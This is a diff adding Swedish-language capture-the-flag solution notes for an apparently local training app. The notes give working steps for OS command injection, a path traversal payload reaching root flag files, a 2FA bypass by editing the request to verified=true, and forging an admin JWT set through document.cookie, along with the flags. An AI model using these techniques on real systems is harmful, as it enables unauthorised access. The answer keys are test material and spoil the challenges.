@@ -110,3 +110,137 @@ Metod 1: Manipulera fältet i DevTools
 Metod 2: Skicka en request via cURL
 
 curl -X POST -d "amount=-1000" http://localhost:5000/bank/transfer
+
+
+Sammanfattning av stegen:
+
+    Navigera till /temple_of_anubis och identifiera input-fältet.
+    Testa whoami för att verifiera att kommandon körs.
+    Kör ls -l flags/ för att se flaggfiler.
+    Läs flaggan med cat flags/os_command_injection.txt.
+
+🎯 Nu har du klarat utmaningen och fått din flagga! 🚀
+
+
+            path traversal
+
+✅ Riktiga flaggan   ../../../../root/flags/true_flag.txt
+❌ Falsk flagga ancient_scroll.txt   ../flags/ancient_scroll.txt
+❌ Falsk flagga cursed_tablet.txt    ../flags/cursed_tablet.txt
+
+------------------------------------------------------------------------------
+
+
+Denna metod visar exakt hur man löser utmaningen med Burp Suite.
+🔥 Steg 1: Registrera en användare
+
+1️⃣ Gå till /register och skapa ett konto.
+2️⃣ Efter registrering skickas du vidare till /login.
+🔥 Steg 2: Logga in och få din 2FA-kod
+
+1️⃣ Gå till /login, logga in med dina uppgifter.
+2️⃣ Du skickas vidare till /verify_2fa där du får en 2FA-kod.
+3️⃣ Notera koden – men du behöver inte använda den.
+🔥 Steg 3: Exploatera 2FA-buggen med Burp Suite
+
+1️⃣ Öppna Burp Suite och aktivera Intercept Mode.
+2️⃣ Gå till /verify_2fa, fyll i formuläret och skicka det.
+3️⃣ När Burp fångar requesten, ändra request body till:
+
+2fa=000000&verified=true
+
+📌 Du kan skriva vad som helst i 2fa eller lämna den tom – det viktiga är verified=true.
+4️⃣ Frigör requesten och se vad som händer!
+5️⃣ Du blir inloggad och skickas till /game.
+🔥 Steg 4: Lås upp Pharaoh’s Vault och ta flaggan
+
+1️⃣ Gå till /game och fyll i rätt lösenord:
+
+𓂀𓏏𓆣𓊪
+
+2️⃣ I fältet för 2FA kan du skriva vad som helst eller lämna det tomt.
+3️⃣ Klicka på "Unlock the Vault" och få flaggan!
+🏆 Flagga
+
+🚀 När du exploaterat buggen och angett lösenordet korrekt får du:
+
+O24{PHARAOHS_2FA_BROKEN}
+
+🔥 Varför fungerar detta?
+
+    Applikationen litar på verified=true, vilket gör att vi kan hoppa över 2FA-verifieringen.
+    Vi kan skicka en tom 2FA-kod och ändå bli godkända.
+    Flask använder sessionshantering, vilket betyder att vi kan manipulera vår autentisering i Burp.
+
+--------------------------------------------------------------------------------------
+
+
+document.cookie = "auth_token="TOKEN"; path=/";
+
+
+
+
+
+Om du vill göra allt direkt från jwt.io istället för att använda Python-skriptet, följer du dessa steg:
+🛠 Steg för att manipulera JWT på jwt.io
+
+    Öppna jwt.io
+
+    Klistra in din nuvarande JWT
+        Till exempel:
+
+    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAidXNlciIsICJleHAiOiAxNzQxOTYxOTYzfQ.p2egRol2RTzmjCgiAffOba1htqma-RfEJC0ZtZsQcE0
+
+Gå till "Payload" (mellersta sektionen)
+
+    Ändra "role": "user" till
+
+    "role": "admin"
+
+Signaturen är sårbar, så vi byter ut den!
+
+    Skrolla ner till "Verify Signature".
+    Radera allt i "your-256-bit-secret" och skriv istället:
+
+        MAYCAQACAQA=
+
+        (Detta är den magiska strängen som gör att servern accepterar JWT:n.)
+
+    Kopiera den nya JWT-tokenen
+        Den ska nu ha rätt "role": "admin", och signaturen ska vara MAYCAQACAQA=.
+
+🚀 Hur använder du den nya JWT i webbläsaren?
+
+    Öppna Developer Tools (F12) i Chrome/Firefox
+
+    Gå till Console och skriv in:
+
+document.cookie = "auth_token=DIN_NYA_JWT_HÄR; path=/";
+
+    Byt ut DIN_NYA_JWT_HÄR mot den du fick från jwt.io.
+    Exempel:
+
+        document.cookie = "auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ICJ1c2VyIiwgInJvbGUiOiAiYWRtaW4iLCAiZXhwIjogMTc0MTk2MTk2M30.MAYCAQACAQA=; path=/";
+
+    Tryck Enter och gå sedan till /admin i webbläsaren
+        Om allt gick rätt, ska du se flaggan! 🏆🎉
+
+❗ Vanliga problem och lösningar
+
+    "403 Forbidden" när jag går till /admin
+        Kolla i Developer Tools → Application → Cookies om auth_token finns.
+        Om JWT-tokenen är fel, prova att generera en ny på jwt.io.
+
+    "Invalid token - Signature verification failed"
+        Dubbelkolla att signaturen är MAYCAQACAQA=, inget annat.
+        Se till att "role": "admin" finns i payloaden.
+
+🚀 Nu kan du göra allt direkt från jwt.io!
+
+    Behöver inte köra några Python-skript.
+    Direkt manipulation av JWT i webbläsaren.
+    Snabb och enkel flagg-exploatering! 🔥
+
+Testa detta nu och se om du får flaggan! 🚀🏆
+
+-----------------------------------------------------------------------------------------------------------------------
